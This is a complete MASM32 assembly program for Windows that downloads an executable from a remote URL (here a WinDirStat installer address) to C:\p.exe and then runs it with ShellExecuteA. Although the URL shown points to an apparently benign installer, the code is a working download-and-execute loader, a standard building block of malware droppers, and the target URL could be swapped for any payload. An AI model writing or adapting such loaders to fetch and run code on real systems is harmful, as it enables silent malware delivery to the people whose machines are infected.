.386
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\urlmon.inc
includelib \masm32\lib\urlmon.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\shell32.lib
include \masm32\include\shell32.inc
.data
file         db "http://download01.windirstat.info/wds_current_setup.exe",0
path       db "C:\p.exe",0

    .code

start:
   

invoke URLDownloadToFile, 0, addr file, addr path, 0, 0 ;Download file to "C:\p.exe"
invoke ShellExecuteA, 0, 0, addr path, 0, 0, SW_SHOW ;Execute C:\p.exe
invoke ExitProcess,0 ;Exit process

    ret


end start
